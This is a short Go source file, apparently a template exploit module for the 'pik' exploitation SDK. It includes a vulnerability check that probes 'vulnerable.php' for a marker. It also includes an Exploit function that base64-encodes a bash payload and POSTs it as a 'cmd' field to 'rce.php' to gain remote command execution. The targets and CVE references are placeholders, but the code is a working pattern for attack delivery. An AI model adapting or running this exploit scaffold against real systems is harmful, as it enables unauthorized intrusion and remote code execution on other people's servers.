package main

import (
	"github.com/Chocapikk/pik/sdk"
	_ "github.com/Chocapikk/pik/pkg/cli"
)

// MyExploit is a minimal standalone exploit example.
type MyExploit struct{ sdk.Pik }

func (m *MyExploit) Info() sdk.Info {
	return sdk.Info{
		Description:    "Example standalone exploit",
		Authors:        []string{"Chocapikk"},
		DisclosureDate: "2026-01-01",
		Reliability:    sdk.Typical,
		Stance:         sdk.Aggressive,
		Notes: sdk.Notes{
			Stability:   []string{sdk.CrashSafe},
			SideEffects: []string{sdk.IOCInLogs},
		},
		References: []sdk.Reference{
			// sdk.CVE("2026-XXXXX"),
			// sdk.VulnCheck("advisory-slug"),
		},
		Queries: []sdk.Query{
			// sdk.Shodan(`http.title:"myapp"`),
		},
		Targets: []sdk.Target{sdk.TargetLinux("amd64")},
	}
}

func (m *MyExploit) Check(run *sdk.Context) (sdk.CheckResult, error) {
	resp, err := run.Send(sdk.Request{Path: "vulnerable.php"})
	if err != nil {
		return sdk.CheckResult{Code: sdk.CheckUnknown}, err
	}
	if resp.ContainsAny("vulnerable_marker") {
		return sdk.CheckResult{Code: sdk.CheckVulnerable, Reason: "marker found"}, nil
	}
	return sdk.CheckResult{Code: sdk.CheckSafe, Reason: "not vulnerable"}, nil
}

func (m *MyExploit) Exploit(run *sdk.Context) error {
	cmd := run.CommentTrail(run.Base64Bash(run.Payload()))
	_, err := run.Send(sdk.Request{
		Method: "POST",
		Path:   "rce.php",
		Form:   sdk.Values{"cmd": {cmd}},
	})
	return err
}

func main() {
	sdk.Run(&MyExploit{})
}
